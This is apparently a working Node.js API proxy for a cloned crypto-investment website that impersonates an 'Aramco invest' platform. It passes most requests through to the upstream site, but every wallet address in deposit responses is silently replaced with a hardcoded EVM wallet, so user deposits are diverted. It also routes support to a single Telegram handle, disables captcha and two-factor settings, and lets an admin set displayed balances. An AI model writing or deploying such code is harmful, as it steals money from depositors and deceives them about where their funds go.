/**
 * API proxy for the bundled SPA.
 *
 * Strategy:
 *   1. Auth endpoints (register, login) use our own Postgres-backed user system.
 *   2. All other endpoints are proxied to the upstream API (api.aramcoinvest.net)
 *      so that real data (products, images, tasks, etc.) flows through.
 *   3. Upload/image requests are also proxied so images load correctly.
 *
 * Env:
 *   POSTGRES_URL       — auto-set when you add Vercel Postgres
 *   STUB_ADMIN_SECRET  — POST /api/admin/balance with header x-admin-secret
 *   UPSTREAM_API       — upstream API base (default: https://api.aramcoinvest.net)
 *   DEPOSIT_EVM_ADDRESS — optional override; default is the platform EVM (ETH / Polygon USDT-style) deposit wallet
 */

const https = require("https");
const http = require("http");
const bcrypt = require("bcryptjs");
const db = require("../lib/db");
const langEn = require("../lib/lang-en.json");

/** Single support entry — Telegram only (@LiveSupport24seven). */
const TELEGRAM_SUPPORT = {
  name: "LiveSupport24seven",
  link: "https://t.me/LiveSupport24seven",
  image: "https://telegram.org/img/t_logo.svg",
};

const UPSTREAM = (process.env.UPSTREAM_API || "https://api.aramcoinvest.net").replace(/\/+$/, "");

/** EVM-compatible deposit address (Ethereum, Polygon, BSC, etc.). Patched into recharge API JSON. */
const DEPOSIT_EVM_ADDRESS = String(
  process.env.DEPOSIT_EVM_ADDRESS || "0xfBCf4f29999126BBeb2B27dcf7428C018E2BE86E"
).trim();

const EVM_ADDR_RE = /^0x[a-fA-F0-9]{40}$/;

function patchEvmDepositAddresses(x) {
  if (x === null || x === undefined) return x;
  if (typeof x === "string") {
    return EVM_ADDR_RE.test(x.trim()) ? DEPOSIT_EVM_ADDRESS : x;
  }
  if (Array.isArray(x)) return x.map(patchEvmDepositAddresses);
  if (typeof x === "object") {
    const o = {};
    for (const k of Object.keys(x)) {
      o[k] = patchEvmDepositAddresses(x[k]);
    }
    return o;
  }
  return x;
}

/** Routes that return crypto deposit addresses — normalize to DEPOSIT_EVM_ADDRESS. */
function isDepositApiRoute(route) {
  return (
    route === "/user/recharge" ||
    route === "/user/bank_recharge" ||
    route === "/user/recharge_send" ||
    route === "/user/submit_recharge" ||
    route === "/user/recharge_complete"
  );
}

function applyCors(req, res) {
  const origin =
    process.env.ALLOW_ORIGIN ||
    req.headers.origin ||
    "https://aramco.company";
  res.setHeader("Access-Control-Allow-Origin", origin);
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Authorization, st-lang, st-ctime, st-ttgn, Accept"
  );
}

/** Memory fallback */
const usersByEmail = new Map();
const tokenToEmail = new Map();

function json(req, res, statusCode, body) {
  applyCors(req, res);
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.statusCode = statusCode;
  res.end(JSON.stringify(body));
}

function ok(data) {
  return { status: 200, msg: "ok", data };
}

function err(msg, code = 400) {
  return { status: code, msg: String(msg), data: null };
}

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let raw = "";
    req.on("data", (c) => (raw += c));
    req.on("end", () => {
      if (!raw) return resolve({});
      try {
        resolve(JSON.parse(raw));
      } catch (e) {
        reject(e);
      }
    });
    req.on("error", reject);
  });
}

function collectRawBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => resolve(Buffer.concat(chunks)));
    req.on("error", reject);
  });
}

function getToken(req) {
  const h = req.headers.authorization || "";
  const m = /^Bearer\s+(.+)$/i.exec(h);
  return m ? m[1].trim() : null;
}

async function sessionEmail(req) {
  const t = getToken(req);
  if (!t) return null;
  if (db.usePostgres()) {
    return db.findEmailByToken(t);
  }
  return tokenToEmail.get(t) || null;
}

function memEnsureUser(email) {
  if (!usersByEmail.has(email)) {
    usersByEmail.set(email, {
      email,
      password: "",
      password_hash: "",
      account: email.split("@")[0] || "user",
      balance: "10.00",
      base_money: "10.00",
      available_money: "10.00",
    });
  }
  return usersByEmail.get(email);
}

async function loadUser(email) {
  if (db.usePostgres()) {
    const u = await db.findUserByEmail(email);
    if (!u) return null;
    return u;
  }
  return memEnsureUser(email);
}

function userRow(u) {
  return {
    account: u.account,
    email: u.email,
    base_money: u.base_money,
    available_money: u.available_money,
    balance: u.balance,
    phone: "",
    invitation_code: "DEMO",
    is_pwd: 1,
    head_img: "",
    level: 1,
    vip_level: 0,
    credit_score: 100,
    team_count: 0,
  };
}

async function issueToken(email) {
  const token = "tk_" + Math.random().toString(36).slice(2) + Date.now().toString(36);
  const exp = Math.floor(Date.now() / 1000) + 86400 * 7;
  if (db.usePostgres()) {
    await db.saveSession(token, email, exp);
  } else {
    tokenToEmail.set(token, email);
  }
  return { token, expires_time: exp };
}

/**
 * Proxy a request to the upstream API server.
 * Forwards the original method, headers (minus host), and body.
 * Streams the upstream response back to the client.
 */
function proxyToUpstream(req, res, route, rawBody, opts = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(UPSTREAM + "/api" + route);

    // Preserve query string from original request
    const origUrl = req.url || "";
    const qIdx = origUrl.indexOf("?");
    if (qIdx !== -1) {
      const origParams = new URLSearchParams(origUrl.slice(qIdx + 1));
      // Remove internal 'path' param used by Vercel routing
      origParams.delete("path");
      for (const [k, v] of origParams) {
        url.searchParams.append(k, v);
      }
    }

    const headers = {};
    // Forward select headers
    const forwardHeaders = [
      "content-type",
      "authorization",
      "accept",
      "accept-language",
      "st-lang",
      "st-ctime",
      "st-ttgn",
    ];
    for (const h of forwardHeaders) {
      if (opts.stripAuth && h === "authorization") continue;
      if (req.headers[h]) headers[h] = req.headers[h];
    }

    const mod = url.protocol === "https:" ? https : http;
    const proxyReq = mod.request(
      url,
      {
        method: req.method,
        headers,
        timeout: 15000,
      },
      (proxyRes) => {
        applyCors(req, res);
        // Forward content-type and other response headers
        const ct = proxyRes.headers["content-type"];
        if (ct) res.setHeader("Content-Type", ct);
        res.statusCode = proxyRes.statusCode || 200;
        proxyRes.pipe(res);
        proxyRes.on("end", resolve);
        proxyRes.on("error", (e) => {
          if (!res.headersSent) {
            json(req, res, 502, err("upstream stream error: " + e.message, 502));
          } else {
            res.destroy();
          }
          resolve();
        });
      }
    );

    proxyReq.on("error", (e) => {
      json(req, res, 502, err("upstream error: " + e.message, 502));
      resolve();
    });

    proxyReq.on("timeout", () => {
      proxyReq.destroy();
      json(req, res, 504, err("upstream timeout", 504));
      resolve();
    });

    if (rawBody && rawBody.length > 0) {
      proxyReq.setHeader("Content-Length", rawBody.length);
      proxyReq.write(rawBody);
    }
    proxyReq.end();
  });
}

function isLocalIssuedToken(req) {
  const t = getToken(req);
  return Boolean(t && /^tk_/i.test(t));
}

/**
 * When the SPA uses our local login token (tk_*), upstream does not recognize it and returns
 * 410000 / 401 — the client then clears cookies and reloads ("kicked out"). For /user/* routes
 * we substitute safe empty payloads so navigation keeps working.
 */
function localStubForUserRoute(route, method) {
  const m = (method || "GET").toUpperCase();
  // Deposit / recharge — show unified EVM wallet when upstream rejects local tk_* token
  if (route === "/user/recharge" && m === "GET") {
    return [
      {
        type: 1,
        show_name: "USDT (Polygon / ERC20)",
        image: "https://cryptologos.cc/logos/tether-usdt-logo.png",
        address: DEPOSIT_EVM_ADDRESS,
      },
    ];
  }
  if (route === "/user/bank_recharge" && m === "POST") {
    return {
      recharge_address: DEPOSIT_EVM_ADDRESS,
      recharge_type: "1",
      recharge_type_name: "USDT",
    };
  }
  if (route === "/user/recharge_send" && m === "POST") return { status: 1 };
  if (route === "/user/submit_recharge" && m === "POST") return {};
  if (route === "/user/recharge_complete" && m === "GET") return [];
  const arrayRoutes = new Set([
    "/user/task_center",
    "/user/get_share_task",
    "/user/invite_give",
    "/user/user_rank",
    "/user/vip_level_record",
  ]);
  if (arrayRoutes.has(route)) return [];
  if (route === "/user/task_center_receive" && m === "POST") return {};
  if (route === "/user/invite_give_receive" && m === "POST") return {};
  if (route === "/user/set_pwd" && m === "POST") return {};
  if (route === "/user/edit_recharge" && m === "POST") return {};
  if (route === "/user/team_recharge" && m === "POST") return {};
  const objectRoutes = new Set([
    "/user/task_center_detail",
    "/user/share_config",
    "/user/invite_info",
    "/user/edit_recharge",
    "/user/team_recharge",
  ]);
  if (objectRoutes.has(route)) return {};
  return {};
}

/** Same as proxyToUpstream but buffers JSON to allow local-user fallback. */
function proxyToUpstreamBuffered(req, route, rawBody, opts = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(UPSTREAM + "/api" + route);
    const origUrl = req.url || "";
    const qIdx = origUrl.indexOf("?");
    if (qIdx !== -1) {
      const origParams = new URLSearchParams(origUrl.slice(qIdx + 1));
      origParams.delete("path");
      for (const [k, v] of origParams) {
        url.searchParams.append(k, v);
      }
    }
    const headers = {};
    const forwardHeaders = [
      "content-type",
      "authorization",
      "accept",
      "accept-language",
      "st-lang",
      "st-ctime",
      "st-ttgn",
    ];
    for (const h of forwardHeaders) {
      if (opts.stripAuth && h === "authorization") continue;
      if (req.headers[h]) headers[h] = req.headers[h];
    }
    const mod = url.protocol === "https:" ? https : http;
    const proxyReq = mod.request(
      url,
      { method: req.method, headers, timeout: 15000 },
      (proxyRes) => {
        const chunks = [];
        proxyRes.on("data", (c) => chunks.push(c));
        proxyRes.on("end", () => {
          resolve({
            statusCode: proxyRes.statusCode || 200,
            body: Buffer.concat(chunks),
            contentType: proxyRes.headers["content-type"] || "",
          });
        });
        proxyRes.on("error", reject);
      }
    );
    proxyReq.on("error", reject);
    proxyReq.on("timeout", () => {
      proxyReq.destroy();
      reject(new Error("upstream timeout"));
    });
    if (rawBody && rawBody.length > 0) {
      proxyReq.setHeader("Content-Length", rawBody.length);
      proxyReq.write(rawBody);
    }
    proxyReq.end();
  });
}

/**
 * Buffered JSON proxy: local tk_* users get stubs on upstream auth errors; deposit routes get
 * all 0x addresses rewritten to DEPOSIT_EVM_ADDRESS for every client (including upstream sessions).
 */
async function proxyToUpstreamUserJson(req, res, route, rawBody, email) {
  const localTk = Boolean(email && isLocalIssuedToken(req) && route.startsWith("/user/"));
  try {
    const buf = await proxyToUpstreamBuffered(req, route, rawBody, {});
    const str = buf.body.toString("utf8");
    let parsed;
    try {
      parsed = JSON.parse(str);
    } catch (e) {
      applyCors(req, res);
      if (buf.contentType) res.setHeader("Content-Type", buf.contentType);
      res.statusCode = buf.statusCode;
      res.end(buf.body);
      return;
    }
    const st = parsed.status;
    if (localTk && (st === 410000 || st === 401 || st === 402 || st === 403)) {
      return json(req, res, 200, ok(localStubForUserRoute(route, req.method)));
    }
    let out = parsed;
    if (isDepositApiRoute(route)) {
      out = patchEvmDepositAddresses(parsed);
    }
    applyCors(req, res);
    res.setHeader("Content-Type", "application/json; charset=utf-8");
    res.statusCode = buf.statusCode;
    res.end(JSON.stringify(out));
  } catch (e) {
    json(req, res, 502, err("upstream error: " + (e.message || "error"), 502));
  }
}

/**
 * Proxy upload/image requests to upstream.
 * Handles paths like /upload/img/xxx.webp, /upload/files/xxx.jpg
 */
function proxyUpload(req, res, uploadPath) {
  return new Promise((resolve, reject) => {
    const url = new URL(UPSTREAM + "/" + uploadPath);
    const mod = url.protocol === "https:" ? https : http;

    const proxyReq = mod.request(
      url,
      { method: "GET", timeout: 15000 },
      (proxyRes) => {
        applyCors(req, res);
        const ct = proxyRes.headers["content-type"];
        if (ct) res.setHeader("Content-Type", ct);
        const cl = proxyRes.headers["content-length"];
        if (cl) res.setHeader("Content-Length", cl);
        const cc = proxyRes.headers["cache-control"];
        res.setHeader("Cache-Control", cc || "public, max-age=86400, immutable");
        res.statusCode = proxyRes.statusCode || 200;
        proxyRes.pipe(res);
        proxyRes.on("end", resolve);
        proxyRes.on("error", (e) => {
          if (!res.headersSent) {
            res.statusCode = 502;
            res.end("upstream stream error");
          } else {
            res.destroy();
          }
          resolve();
        });
      }
    );

    proxyReq.on("error", (e) => {
      res.statusCode = 502;
      res.end("upstream error");
      resolve();
    });

    proxyReq.on("timeout", () => {
      proxyReq.destroy();
      res.statusCode = 504;
      res.end("upstream timeout");
      resolve();
    });

    proxyReq.end();
  });
}

module.exports = async (req, res) => {
  if (req.method === "OPTIONS") {
    applyCors(req, res);
    res.statusCode = 204;
    return res.end();
  }

  let parts = req.query.path;
  if (!parts) parts = [];
  if (typeof parts === "string") parts = parts.includes("/") ? parts.split("/").filter(Boolean) : [parts];
  if (!Array.isArray(parts)) parts = [parts];
  const route = "/" + parts.join("/");

  // Collect raw body early so we can forward it if proxying
  const rawBody = req.method !== "GET" && req.method !== "HEAD"
    ? await collectRawBody(req)
    : null;

  /** Parse JSON or x-www-form-urlencoded (SPA sometimes posts form-style bodies). */
  function parsedBody() {
    if (!rawBody || rawBody.length === 0) return {};
    const str = rawBody.toString();
    try {
      return JSON.parse(str);
    } catch (e) {
      const ct = String(req.headers["content-type"] || "").toLowerCase();
      if (ct.includes("application/x-www-form-urlencoded") || str.includes("=")) {
        try {
          const params = new URLSearchParams(str);
          const o = {};
          params.forEach((v, k) => {
            o[k] = v;
          });
          if (Object.keys(o).length) return o;
        } catch (e2) {}
      }
      return {};
    }
  }

  function pickEmail(b) {
    const raw =
      b.email ||
      b.user_email ||
      b.userEmail ||
      b.account ||
      b.username ||
      b.mail ||
      b.login ||
      "";
    return String(raw).trim().toLowerCase();
  }

  function pickPassword(b) {
    const raw = b.password ?? b.pwd ?? b.pass ?? b.user_pwd ?? "";
    return String(raw);
  }

  try {
    // --- Upload/image proxy (paths like upload/img/..., upload/files/...) ---
    // Handle these before DB init so they work even if Postgres is down.
    if (route.startsWith("/upload/")) {
      return proxyUpload(req, res, route.slice(1));
    }

    // --- Health/debug endpoint ---
    if (route === "/admin/health") {
      const info = {
        postgres_configured: db.usePostgres(),
        postgres_url_prefix: (db.resolvePostgresUrl() || "").slice(0, 30) + "...",
        timestamp: new Date().toISOString(),
      };
      if (db.usePostgres()) {
        try {
          await db.ensureSchema();
          info.postgres_connected = true;
        } catch (e) {
          info.postgres_connected = false;
          info.postgres_error = e.message;
        }
      }
      return json(req, res, 200, ok(info));
    }

    // Locale strings: must be raw nested JSON (no {status,msg,data}) so loadLanguageAsync →
    // mergeLocaleMessage(locale, body) receives tabbar/app/vip keys at the root. Upstream
    // returns wrapped JSON and the UI shows raw keys like tabbar.index.
    if (route === "/public/get_lang_json" && req.method === "GET") {
      applyCors(req, res);
      res.setHeader("Content-Type", "application/json; charset=utf-8");
      res.statusCode = 200;
      return res.end(JSON.stringify(langEn));
    }

    // Home/index payload: strip third-party chat script; single Telegram support only.
    if (route === "/public/index_info" && req.method === "GET") {
      try {
        const buf = await proxyToUpstreamBuffered(req, route, rawBody);
        const str = buf.body.toString("utf8");
        const upstream = JSON.parse(str);
        const d = upstream.data || {};
        if (d.sys_info) d.sys_info.salesmartly_src = "";
        d.customer = [TELEGRAM_SUPPORT];
        upstream.data = d;
        return json(req, res, 200, upstream);
      } catch (e) {
        return proxyToUpstream(req, res, route, rawBody);
      }
    }

    // Init DB schema (only if Postgres is configured)
    if (db.usePostgres()) {
      await db.ensureSchema();
    }

    // --- Admin endpoints (local only) ---
    function adminAuth() {
      const secret = process.env.STUB_ADMIN_SECRET;
      if (!secret || req.headers["x-admin-secret"] !== secret) return false;
      return true;
    }

    if (route === "/admin/balance" && req.method === "POST") {
      if (!adminAuth()) return json(req, res, 403, err("Forbidden", 403));
      const b = parsedBody();
      const email = String(b.email || "").toLowerCase();
      const amount = String(b.balance != null ? b.balance : "0");
      if (!email) return json(req, res, 400, err("email required"));
      if (db.usePostgres()) {
        const u = await db.updateBalanceByEmail(email, amount);
        if (!u) return json(req, res, 404, err("user not found", 404));
        return json(req, res, 200, ok({ updated: true, email, balance: amount }));
      }
      const u = memEnsureUser(email);
      u.balance = amount;
      u.base_money = amount;
      u.available_money = amount;
      return json(req, res, 200, ok({ updated: true, email, balance: amount }));
    }

    // List all users
    if (route === "/admin/users" && req.method === "GET") {
      if (!adminAuth()) return json(req, res, 403, err("Forbidden", 403));
      if (db.usePostgres()) {
        const users = await db.listAllUsers();
        return json(req, res, 200, ok({ users }));
      }
      const users = Array.from(usersByEmail.values()).map(u => ({
        email: u.email, account: u.account, balance: u.balance, created_at: null
      }));
      return json(req, res, 200, ok({ users }));
    }

    // Delete a user
    if (route === "/admin/delete_user" && req.method === "POST") {
      if (!adminAuth()) return json(req, res, 403, err("Forbidden", 403));
      const b = parsedBody();
      const email = String(b.email || "").toLowerCase();
      if (!email) return json(req, res, 400, err("email required"));
      if (db.usePostgres()) {
        const deleted = await db.deleteUserByEmail(email);
        if (!deleted) return json(req, res, 404, err("user not found", 404));
        return json(req, res, 200, ok({ deleted: true, email }));
      }
      if (!usersByEmail.has(email)) return json(req, res, 404, err("user not found", 404));
      usersByEmail.delete(email);
      return json(req, res, 200, ok({ deleted: true, email }));
    }

    // --- Auth endpoints (local user system) ---
    if (route.startsWith("/user/register") && req.method === "POST") {
      const b = parsedBody();
      const email = pickEmail(b);
      const password = pickPassword(b) || "demo123";
      if (!email) return json(req, res, 200, err("email required", 400003));
      const account = email.split("@")[0] || "user";
      const hash = await bcrypt.hash(password, 10);

      if (db.usePostgres()) {
        const exists = await db.emailExists(email);
        if (exists) return json(req, res, 200, err("exists", 400003));
        await db.createUser({ email, passwordHash: hash, account });
        const u = await db.findUserByEmail(email);
        const { token, expires_time } = await issueToken(email);
        return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
      }

      if (usersByEmail.has(email)) return json(req, res, 200, err("exists", 400003));
      const u = {
        email,
        password,
        password_hash: "",
        account,
        balance: "10.00",
        base_money: "10.00",
        available_money: "10.00",
      };
      usersByEmail.set(email, u);
      const { token, expires_time } = await issueToken(email);
      return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
    }

    if (route.startsWith("/user/login") && !route.includes("login_info") && !route.includes("login_verify") && req.method === "POST") {
      const b = parsedBody();
      const email = pickEmail(b);
      const password = pickPassword(b);
      if (!email) return json(req, res, 200, err("invalid", 401));

      if (db.usePostgres()) {
        const u = await db.findUserByEmail(email);
        if (!u) return json(req, res, 200, err("invalid", 401));
        const okPass = await bcrypt.compare(password, u.password_hash);
        if (!okPass) return json(req, res, 200, err("invalid", 401));
        const { token, expires_time } = await issueToken(email);
        return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
      }

      const u = memEnsureUser(email);
      if (u.password && u.password !== password) return json(req, res, 200, err("invalid", 401));
      if (!u.password) u.password = password || "demo123";
      const { token, expires_time } = await issueToken(email);
      return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
    }

    if (route === "/user/tg" && req.method === "POST") {
      const email = "tg@demo.local";
      if (db.usePostgres()) {
        if (!(await db.emailExists(email))) {
          const hash = await bcrypt.hash("tg-demo", 10);
          await db.createUser({ email, passwordHash: hash, account: "tg" });
        }
        const u = await db.findUserByEmail(email);
        const { token, expires_time } = await issueToken(email);
        return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
      }
      const u = memEnsureUser(email);
      const { token, expires_time } = await issueToken(email);
      return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
    }

    // --- App/login config (local, not proxied) ---
    // These must be handled locally so captcha/registration settings
    // stay compatible with our own auth system.
    if ((route === "/user/login_info" && req.method === "POST") ||
        (route === "/user/app_info" && req.method === "GET")) {
      // Fetch upstream config and override auth-related fields
      return new Promise((resolve) => {
        const url = new URL(UPSTREAM + "/api" + route);
        const mod = url.protocol === "https:" ? https : http;
        const proxyReq = mod.request(url, { method: "GET", timeout: 8000 }, (proxyRes) => {
          let body = "";
          proxyRes.on("data", (c) => (body += c));
          proxyRes.on("end", () => {
            try {
              const upstream = JSON.parse(body);
              const d = upstream.data || {};
              // Override registration/captcha settings for our local auth
              if (d.register_info) {
                d.register_info.register_is_captcha = "false";
                d.register_info.invitation_code_require = "false";
              }
              if (d.setting) {
                d.setting.register_is_captcha = "false";
                d.setting.google_secret_status = "false";
                d.setting.salesmartly_src = "";
              }
              // Floating help / chat: only Telegram @LiveSupport24seven
              d.customer = [TELEGRAM_SUPPORT];
              upstream.data = d;
              json(req, res, 200, upstream);
            } catch (e) {
              // Fallback: return minimal local config
              json(req, res, 200, ok({
                register_info: {
                  register_is_captcha: "false",
                  invitation_code_require: "false",
                  is_repeat_password: "true",
                  register_account_status: "true",
                },
                setting: {
                  register_is_captcha: "false",
                  index_is_login: "false",
                  pwa_app_name: "Aramco",
                  salesmartly_src: "",
                },
                customer: [TELEGRAM_SUPPORT],
                theme: 1,
              }));
            }
            resolve();
          });
          proxyRes.on("error", () => {
            json(req, res, 200, ok({
              register_info: { register_is_captcha: "false" },
              setting: { salesmartly_src: "" },
              customer: [TELEGRAM_SUPPORT],
              theme: 1,
            }));
            resolve();
          });
        });
        proxyReq.on("error", () => {
          json(req, res, 200, ok({
            register_info: { register_is_captcha: "false" },
            setting: { salesmartly_src: "" },
            customer: [TELEGRAM_SUPPORT],
            theme: 1,
          }));
          resolve();
        });
        proxyReq.on("timeout", () => {
          proxyReq.destroy();
          json(req, res, 200, ok({
            register_info: { register_is_captcha: "false" },
            setting: { salesmartly_src: "" },
            customer: [TELEGRAM_SUPPORT],
            theme: 1,
          }));
          resolve();
        });
        proxyReq.end();
      });
    }

    if (route === "/user/login_verify" && req.method === "GET") {
      applyCors(req, res);
      res.setHeader("Content-Type", "image/png");
      res.statusCode = 200;
      const png = Buffer.from(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
        "base64"
      );
      return res.end(png);
    }

    // --- User info endpoints (local user data) ---
    const email = await sessionEmail(req);
    if ((route === "/user/user_info" || route === "/user/mine") && req.method === "GET") {
      if (!email) return json(req, res, 200, err("unauthorized", 401));
      const u = await loadUser(email);
      if (!u) return json(req, res, 200, err("unauthorized", 401));
      return json(req, res, 200, ok(userRow(u)));
    }

    // Change password (SPA: POST /user/edit_login_pwd)
    if (route === "/user/edit_login_pwd" && req.method === "POST") {
      if (!email) return json(req, res, 200, err("unauthorized", 401));
      const b = parsedBody();
      const oldPwd = String(b.pwd ?? b.old_pwd ?? "").trim();
      const newPwd = String(b.new_pwd ?? "").trim();
      const repeatPwd = String(b.repeat_new_pwd ?? "").trim();
      if (!oldPwd) return json(req, res, 200, err("old_required", 400));
      if (!newPwd) return json(req, res, 200, err("new_required", 400));
      if (newPwd !== repeatPwd) return json(req, res, 200, err("mismatch", 400));
      if (db.usePostgres()) {
        const u = await db.findUserByEmail(email);
        if (!u) return json(req, res, 200, err("unauthorized", 401));
        const okOld = await bcrypt.compare(oldPwd, u.password_hash);
        if (!okOld) return json(req, res, 200, err("wrong_password", 400));
        const hash = await bcrypt.hash(newPwd, 10);
        await db.updatePasswordHash(email, hash);
        return json(req, res, 200, ok({}));
      }
      const u = memEnsureUser(email);
      if (u.password && u.password !== oldPwd) {
        return json(req, res, 200, err("wrong_password", 400));
      }
      u.password = newPwd;
      return json(req, res, 200, ok({}));
    }

    // --- Everything else: proxy to upstream ---
    if (email && isLocalIssuedToken(req) && route === "/user/upload" && req.method === "POST") {
      return proxyToUpstream(req, res, route, rawBody, { stripAuth: true });
    }
    if (
      isDepositApiRoute(route) ||
      (email && isLocalIssuedToken(req) && route.startsWith("/user/"))
    ) {
      return proxyToUpstreamUserJson(req, res, route, rawBody, email);
    }
    return proxyToUpstream(req, res, route, rawBody);

  } catch (e) {
    return json(req, res, 500, err(e.message || "error", 500));
  }
};
